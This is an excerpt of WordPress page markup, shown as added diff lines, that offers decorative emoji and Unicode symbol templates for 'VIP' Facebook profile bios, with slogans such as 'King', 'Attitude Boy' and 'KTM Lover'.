+<p class="has-text-align-center">🔘⟶⟶⟵💠💠⟶⟵⟵🔘<br>✭<br>✭<br>⟣⃟⸻🌹༻❣️༺🌹⸻⃟⟢<br>✭<br>✭<br>,•’<code>’•,•’</code>’•,<br>’•,<code>💜</code> •’<br><code>’•,,•’</code><br>✭<br>✭<br>⟣⃟⸻🌹༻❣️༺🌹⸻⃟⟢<br>✭<br>✭<br>🔘⟶⟶⟵💠💠⟶⟵⟵🔘</p>
+
+
+
+<p class="has-text-align-center">❤I♦ Dont♦ Know♦ Why♦ I♦ Like♦ You<br>🎈I♦ Miss♦ U♦ चाहत♦ Se😍<br>❤Because♦ it♦ hurts😏</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_f5018e-4c"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_d0e1f5-b5 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_d0e1f5-b5"><span class="ez-toc-section" id="Facebook_VIP_Bio_Stylish_2024"></span>Facebook VIP Bio Stylish 2024<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_4ba264-d5 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_2aeacb-ed inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🖤 💜⭕💜 💙❖⭕❖💙<br>◈•┼┼•🌹•┼┼•◈ ✮┼✮<br>━━❖❖♥❖❖━━<br>꧁𑁍Name𑁍꧂<br>━━❖❖♥❖❖━━<br>✮┼✮ ◈•┼┼•🌹•┼┼•◈<br>💜❖⭕❖💜 🧡⭕🧡 🖤</p>
+
+
+
+<p class="has-text-align-center">♐<br>◢◤⚝◥◣<br>◥◣⚜◢◤<br>🟪▇☆☣☆▇🟪<br>🟦━❖✥◈✥❖━🟦<br>●🔷❤VIP ACCOUNT ❤️🔷●<br>🟧━❖✥◈✥❖━🟧<br>🟪▇☆☣☆▇🟪<br>◢◤⚝◥◣<br>◥◣⚜◢◤<br>♐</p>
+
+
+
+<p class="has-text-align-center">👑Papa♦ ki♦ Pari💫<br>💞Dilo♦ ka♦ Raja💞<br>⏭️😎Smart♦ BOY🔥<br>🖤♦ Friendship♦ Goal🖤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_377740-f2"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_7ba88b-30 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_7ba88b-30"><span class="ez-toc-section" id="Facebook_VIP_Account_Stylish_Text"></span>Facebook VIP Account Stylish Text<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_dc02cb-f3 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_f837d2-4f inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">██✮┼✮🖤✮┼✮██<br>💠♦❖♥❖♦💠<br>💠♦💠<br>💠💠<br>💠<br>♦❖♥❖🖤❖♥❖♦<br>King<br>♦❖♥❖🖤❖♥❖♦<br>💠<br>💠💠<br>💠♦💠<br>💠♦❖♥❖♦💠<br>██✮┼✮🖤✮┼✮██</p>
+
+
+
+<p class="has-text-align-center">💙✿✿✿<br>💙✿✿✿<br>💙✿✿<br>💙✿<br>✿💙<br>༒✿💙<br>༒✿✿💙<br>༒✿✿✿💙<br>༒✿✿✿💙<br>༒✿✿💙<br>༒✿💙<br>༒✿</p>
+
+
+
+<p class="has-text-align-center">🏍️~KtM♦ Lover~🏍️<br>👔Unique♦ Persnality♦ 👟<br>😇♦ Respect♦ For♦ Girls😇<br>🕉️♦ MAHAKAL♦ Bhakt<br>Mummy♦ Ki♦ Queen❤️</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_c24f5f-23"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_39d762-4c wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_39d762-4c"><span class="ez-toc-section" id="VIP_Facebook_Account_Bio_Stylish"></span>VIP Facebook Account Bio Stylish<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_b2cd44-c2"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/8-custom-2.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-426" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/8-custom-2.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/8-custom-2-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_9ee6f7-95 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_d63f41-40 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◣<br>◢█◣<br>◥◣◢◤<br>◢◤♦️██♦️◥◣<br>██████<br>☬❣●▬▬๑♥️๑▬▬●❣☬<br>☬Àttítüdé😎Boy☬<br>☬❣●▬▬๑♥️๑▬▬●❣☬<br>██████<br>◥◣♦️██♦️◢◤<br>◢◤◥◣<br>◥█◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">▅▅▅▅▅▅▅▅▅▅▅<br>▅▅▅▅▅▅▅▅<br>▅▅▅▅▅▅<br>▅▅▅▅<br>◥◤<br>★❍ ❉Ꮙ.Ꭵ.Ꭾ❉❍★<br>◢◣<br>▅▅▅▅<br>▅▅▅▅▅▅<br>▅▅▅▅▅▅▅▅<br>▅▅▅▅▅▅▅▅▅▅▅</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_75417e-79"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_de3c1d-73 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_de3c1d-73"><span class="ez-toc-section" id="Facebook_VIP_Account_Stylish_Text_Copy"></span>Facebook VIP Account Stylish Text Copy<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_a59243-ca alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_a0ac22-20 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🤩100%✓__SÎńğłé<br>》__Chocolate__Lover🤣<br>🎶Music<br>😘I♦ Like♦ Cars🚙<br>😜Only♦ Moj🥰<br>💔Hearking❣️<br>☺️My♦ Name♦ You♦ Alway♦ Knows😁<br>🏍️KTM♦ Lover💘</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_cd0214-7c"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_4b89df-cf wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_4b89df-cf"><span class="ez-toc-section" id="Facebook_VIP_Account_Bio_Stylish"></span>Facebook VIP Account Bio Stylish<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_1b3a1a-26 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_9b326c-70 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◣<br>◢◤🖤◥◣<br>◥◣💢◢◤<br>❖ ──💢── ❖<br>❖─☸🖤♥️☸─❖<br>❖─♡️⏤͟͟͞͞★V.I.P♡️─❖<br>❖─☸♥️🖤☸─❖<br>❖ ──💢── ❖<br>◢◤💢◥◣<br>◥◣🖤◢◤</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◢◤🖤◥◣<br>◥◣🖤◢◤<br>◥◤<br>❖─❥💙❥─❖<br>╔━━❖❖☬❖❖━━╗<br>◆❖☬❉BadBoy❉❖☬◆<br>╚━━❖❖☬❖❖━━╝<br>❖─❥💙❥─❖<br>◢◣<br>◢◤🖤◥◣<br>◥◣🖤◢◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">♦️❖♦️❖♥️❖♦️❖♦️<br>♦️♦❖❖♦♦️<br>♦️♦♦️<br>♦️♦️<br>♦️<br>╔━━❖❖♥❖❖━━╗<br>⭕🖤KING🖤⭕<br>╚━━❖❖♥❖❖━━╝<br>♦️<br>♦️♦️<br>♦️♦♦️<br>♦️❖♦️❖♥️❖♦️❖♦️</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_44fe15-f4"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_efe10e-23 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_efe10e-23"><span class="ez-toc-section" id="Facebook_VIPs_Bio_Attitude_Boy"></span>Facebook VIPs Bio Attitude Boy<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_fbac7a-57"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/1-custom-3.webp" alt="" class="kb-img wp-image-435" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/1-custom-3.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/1-custom-3-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_8da834-d4 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_2ae159-1c inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">❤️❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤<br>❤❥━━❥🖤❥━━❥❤</p>
+
+
+
+<p class="has-text-align-center">▆◤▬▭▬▭▬▭▬▭▬▭▬▭▬◥▆<br>💕ஐ༺༻༺༻💕<br>༒<br>█<br>༒<br>༒◥▓█◣۩ஐ▚💕Love U💕▞ஐ۩◢▓█◤༒<br>༒<br>█<br>༒<br>▆◤▬▭▬▭▬▭▬▭▬▭▬▭▬◥▆</p>
+
+
+
+<p class="has-text-align-center">✮☸✮<br>✮┼💠┼✮<br>☸💠━━•💓•━━💠☸<br>✮☸✮<br>✮┼💠┼✮<br>☸🌹━━•💟•━━🌹☸<br>✮┼💠┼✮<br>✮☸✮<br>☸💠━━•💓•━━💠☸<br>✮☸✮<br>✮┼💠┼✮</p>
+
+
+
+<p class="has-text-align-center">💠❖💠❖♥️❖💠❖💠<br>█<br>█<br>♦️​❖♦️❖♦️❖♦️❖♦<br>╔━━❖❖🖤❖❖━━╗<br>⭕Love U⭕<br>╚━━❖❖🖤❖❖━━╝<br>♦️​❖♦️❖♦️❖♦️❖♦<br>█<br>█<br>💠❖💠❖♥️❖💠❖💠</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_7d5ce4-de"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_fedb29-af wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_fedb29-af"><span class="ez-toc-section" id="Facebook_VIP_Bio"></span>Facebook VIP Bio<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_2eafde-82 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_21068f-79 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">╱◣◥◤◢╲<br>◥✺◣◢✺◣♛◢✺◣◢✺◤<br>♠️❤️Tera Yaar❤️♠️<br>◢✺◤◥✺◤♛◥✺◤◥✺◣<br>╲◣◥◤◢╱<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤<br>◥⚚◤</p>
+
+
+
+<p class="has-text-align-center">🖤✿✿✿<br>💙✿✿✿<br>🖤✿✿<br>💙✿<br>✿🖤<br>༒✿💙<br>༒✿✿🖤<br>༒✿✿✿💙<br>༒✿✿✿🖤<br>༒✿✿💙<br>༒✿🖤<br>༒✿</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◢◤💠◥◣<br>◥◣☸◢◤<br>◥◣◥◣★◢◤◢◤<br>❖─☸💠💠☸─❖<br>◥▔◣◢☬◣◈◢☬◣◢▔◤<br>💠✮☆KiNG☆✮💠<br>◢▂◤◥☬◤◈◥☬◤◥▂◣<br>❖─☸💠💠☸─❖<br>◥◣◥◣★◢◤◢◤<br>◢◤☸◥◣<br>◥◣💠◢◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">❣☬❣●▬▬๑♥️๑▬▬●❣☬❣<br>━━❖💜❖━━<br>༺✮༻<br>༺✮༻<br>༺✮༻<br>♦️━━•🖤•━━♦️<br>༺King༻<br>༺✮༻<br>༺✮༻<br>༺✮༻<br>━━❖💙❖━━<br>❣️☬●▬▬๑♥️๑▬▬●☬❣️</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_bf7eb2-b4"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_1c995e-4f wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_1c995e-4f"><span class="ez-toc-section" id="Facebook_Bio_Symbols_for_VIP_Account"></span>Facebook Bio Symbols for VIP Account<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_214125-4f alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_0fd170-13 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◣<br>◢◤♦️◥◣<br>◥◣♦️◢◤<br>❥━━❥🖤❥━━❥<br>❥━━❥🔰❥━━❥<br>❥━━❥♥️❥━━❥<br>♦️⭕King⭕♦️<br>❥━━❥♥️❥━━❥<br>❥━━❥🔰❥━━❥<br>❥━━❥🖤❥━━❥<br>◢◤♦️◥◣<br>◥◣♦️◢◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◢◤🔷◥◣<br>༒◥█◣۩ஐ▚♠️▞ஐ۩◢█◤༒<br>◥◣💠◢◤<br>♦️◈🔷 ★❍Bad Boy❍★🔷◈♦️<br>◢◤💠◥◣<br>༒◥█◣۩ஐ▚♠️▞ஐ۩◢█◤༒<br>◥◣🔷◢◤<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">◢ ▇ ◣ ♥️ ◢ ▇ ◣<br>▇ ▇ ▇ ◣ ◢ ▇ ▇ ▇<br>◥ ▇ ▇ ▇ ▇ ▇ ▇ ◤<br>◥ ▇ ▇ ▇ ▇ ◤<br>◥ ▇ ▇ ◤<br>◥ ◤<br>╔══❤️══╗<br>♥️LOVE ♥️<br>╚══❤️══╝</p>
+
+
+
+<p class="has-text-align-center">💠♦️​❖♥❖♦️💠<br>💠💠🖤💠💠<br>💠🖤💠<br>💠💠<br>💠​<br>🖤♦️​❖♥❖♦️🖤<br>💠 💠🖤💠💠<br>♦️​❖♥❖♦️<br>💠🖤💠<br>💠💠<br>💠<br>♦️​❖♥❖♦️❖♥❖♦</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_c48f95-39"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_d03bff-68 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_d03bff-68"><span class="ez-toc-section" id="VIP_Account_Facebook_Bio"></span>VIP Account Facebook Bio<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_578ec4-d8"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/10-custom-2.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-428" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/10-custom-2.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/10-custom-2-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_3f7028-19 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_06177b-35 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">💓✿✿✿<br>💓✿✿✿<br>💓✿✿<br>💓✿<br>✿💓<br>༒✿💓<br>༒✿✿💓<br>༒✿✿✿💓<br>༒✿✿✿💓<br>༒✿✿💓<br>༒✿💓<br>༒✿</p>
+
+
+
+<p class="has-text-align-center">◥██◤<br>██<br>██<br>◢██◣<br>⫷▓▓▓(👑)▓▓▓⫸<br>◥██◤<br>◥🔷<br>◥🔷◤<br>◥🔷◤<br>◥🔷◤<br>◥🔷◤<br>◥🔷◤<br>◥🔷◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_413df9-4d"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_969788-f8 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_969788-f8"><span class="ez-toc-section" id="Fb_VIP_Stylish_Bio_Symbols"></span>Fb VIP Stylish Bio Symbols<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_5f1272-f6 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_bd3b8f-80 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">┏━━━•| ❤️ |•━━━┓<br>🟣<br>🔵<br>◢▔▔▔◣<br>╔╝🔥╚╗<br>╠☞Cool Dude☜╣<br>╚╗V.I.P╔╝<br>◥▂▂▂◤<br>🟣<br>🔵<br>●▬▬▬▬●<br>●▬▬▬●<br>┗━━•| ❤️ |•━━┛</p>
+
+
+
+<p class="has-text-align-center">💠💠💠💠💠<br>💠💠💠💠<br>💠💠💠<br>💠💠<br>💠<br>🧡🖤FB KING​🖤🧡<br>💠<br>💠💠<br>💠💠💠<br>💠💠💠💠<br>💠💠💠💠💠</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_43c7e4-a3"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_383109-0c wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_383109-0c"><span class="ez-toc-section" id="VIP_Bio_Symbols_for_Fb"></span>VIP Bio Symbols for Fb<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_499977-85 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_4b974d-27 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">❤<br>✹◢█𖣐◣◢𖣐█◣✹<br>✹ █𖣐████𖣐█ ✹<br>✹◥█𖣐██𖣐█◤✹<br>✹◥█𖣐𖣐█◤✹<br>✹◥◤✹<br>✹🔻✹<br>✹</p>
+
+
+
+<p class="has-text-align-center">♦️​❖♦️❖♦️❖♦️❖♦<br>♦️♦️♦️♦️<br>♦️♦️♦️<br>♦️♦️<br>♦️<br>♦️♦️​❖🖤❖♦️♦️<br>♦️♦️♦️♦️♦️<br>♦️​❖🖤❖♦️<br>♦️♦️♦️<br>♦️♦️<br>♦️<br>♦️​❖♦️❖♦️❖♦️❖♦</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_07874c-77"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_0c9dd2-e7 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_0c9dd2-e7"><span class="ez-toc-section" id="Facebook_VIP_Symbols"></span>Facebook VIP Symbols<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_1742f7-37"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/9-custom-1.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-427" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/9-custom-1.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/9-custom-1-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_4ba763-6e alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_889475-71 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◣<br>◥❤️◤<br>❣●▬▬๑♥️๑▬▬●❣<br>╱◣◢╲<br>◥▔◣❤️◣◈◢❤️◢▔◤<br>❤️ ★Cute🔻Boy★ ❤️<br>◢▂◥❤️◤◈◥❤️◥▂◣<br>❣●▬▬๑♥️๑▬▬●❣<br>◢◤◥◣<br>◥❤️◤<br>◣★◢<br>◥◤</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◢◤💓◥◣<br>◥◣💠◢◤<br>❖ ──💠── ❖<br>❖─☸💠💓💓💠☸─❖<br>❖─♡️⏤͟͟͞͞★Ꮙ.Ꭵ.Ꭾꗄ♡️─❖<br>❖─☸💠💓💓💠☸─❖<br>❖ ──💠── ❖<br>◢◤💠◥◣<br>◥◣💓◢◤<br>◥◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_66d7bf-54"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_6f3ae5-db wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_6f3ae5-db"><span class="ez-toc-section" id="Stylish_Work_Symbols_Facebook"></span>Stylish Work Symbols Facebook<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_2cfa02-88 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_db98a1-d7 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">🖤💛💚💙💜🖤<br>◆◆◆🧡◆◆◆<br>꧁◥◣♦️◢◤꧂<br>꧁🖤⛓💛⛓🖤꧂<br>꧁💙KiNg💙꧂<br>꧁💜⛓🤎⛓💜꧂<br>꧁◥◣♦️◢◤꧂<br>♦<br>♦◆♦<br>◆◆◆🧡◆◆◆<br>🖤💛💚💙💜🖤</p>
+
+
+
+<p class="has-text-align-center">◢◣<br>◥♥️◤<br>╱◣◥♥️◤◢╲<br>◥♥️◤<br>✦✦❚✦✦<br>╔━━❖❖🖤❖❖━━╗<br>⭕Cute Kamina⭕<br>╚━━❖❖🖤❖❖━━╝<br>✦✦❚✦✦<br>◥♥️◤<br>◥♥️◤<br>╱◣◥♥️◤◢╲<br>◥◤</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_9d3a39-4e"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_d0eb0e-3a wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_d0eb0e-3a"><span class="ez-toc-section" id="Facebook_Work_Symbols"></span>Facebook Work Symbols<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_dcf4e6-81 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_fd43d1-56 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">◢◤❀◥◣<br>♦️♦️♦️♦️<br>꧁🌹◆❃◆∆◆❃◆🌹꧂<br>❣●▬▬๑♥️๑▬▬●❣<br>╔━━❖❖🖤❖❖━━╗<br>👑 FB King👑<br>╚━━❖❖🖤❖❖━━╝<br>❚❣●▬▬๑♥️๑▬▬●❣<br>꧁🌹◆❃◆∆◆❃◆🌹꧂<br>♦️♦️♦️♦️<br>◥◣❀◢◤</p>
+
+
+
+<p class="has-text-align-center">❣☬❣●▬▬๑۩۩๑▬▬●❣☬❣<br>◈★◈■⚀■◈★◈<br>●⬤⚫⬤●<br>◈★◈■⚀■◈★◈<br>❣☬❣●▬๑۩۩๑▬●❣☬❣<br>◈★◈■⚀■◈★◈<br>●⬤⚫⬤●<br>◈★◈■⚀■◈★◈<br>❣☬❣●▬▬๑۩۩๑▬▬●❣☬❣</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_a5a6be-17"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_bfc130-b5 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_bfc130-b5"><span class="ez-toc-section" id="Fb_New_Stylish_Work_Symbols"></span>Fb New Stylish Work Symbols<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+
+<div class="wp-block-kadence-image kb-image76_f789bd-05"><figure class="aligncenter size-full"><img loading="lazy" decoding="async" width="197" height="350" src="https://socialfunda.net/wp-content/uploads/2023/02/2-custom-4.webp" alt="Facebook Stylish Bio" class="kb-img wp-image-437" title="Facebook Stylish Bio" srcset="https://socialfunda.net/wp-content/uploads/2023/02/2-custom-4.webp 197w, https://socialfunda.net/wp-content/uploads/2023/02/2-custom-4-169x300.webp 169w" sizes="auto, (max-width: 197px) 100vw, 197px" /></figure></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_8206aa-2a alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_3150b3-84 inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">♦️<br>♦️🖤♦️<br>♥️<br>♦️♦️<br>♦️<br>▚🖤▞<br>▚❤▞<br>♦️KinG♦️<br>▓█۩ஐ▚❤▞ஐ۩▓█<br>▚❤▞<br>♦️<br>♦️♦️<br>♥️<br>♦️🖤♦️<br>♦️</p>
+
+
+
+<p class="has-text-align-center">♥️▦═══█💓💓█═══▦♥️<br>◢♦️◣<br>◢♦️◣◢♦️◣<br>◥♦️▇▇👑▇▇♦️◤<br>◢♦️乃卂ᗪ 乃ㄖㄚ♦️◣<br>◥♦️▇👑▇♦️◤<br>◥♦️♦️◤<br>◥◤<br>♥️▦═══█💓💓█═══▦♥️</p>
+</div></div>
+
+</div></div>
+
+
+<div class="wp-block-kadence-column kadence-column76_391c99-b5"><div class="kt-inside-inner-col">
+<h3 class="kt-adv-heading76_ce4ddd-ac wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_ce4ddd-ac"><span class="ez-toc-section" id="Fb_Stylish_VIP_Work_Symbols"></span>Fb Stylish VIP Work Symbols<span class="ez-toc-section-end"></span></h3>
+</div></div>
+
+
+<div class="kb-row-layout-wrap kb-row-layout-id76_a5af26-d2 alignnone wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
+
+<div class="wp-block-kadence-column kadence-column76_388109-3d inner-column-1"><div class="kt-inside-inner-col">
+<p class="has-text-align-center">╱╲<br>│ ۩ │<br>│ ۩ │<br>│ ۩ │<br>│ ۩ │<br>│ ۩ │<br>│ ۩ │<br>│ ۩ │<br>◢███◣<br>⫷▓▓▓|☣|▓▓▓⫸<br>◥███◤<br>██<br>██<br>◥█◤</p>
+
+
+
+<p class="has-text-align-center">♦️<br>◢♦️◣◢♦️◣<br>◢♦️▇▇♦️◣<br>◢♦️King♦️◣<br>◥♦️▇▇♦️◤<br>◢♦️◣◢♦️◣<br>◥♦️◤</p>
+</div></div>
+
+</div></div>
+
+
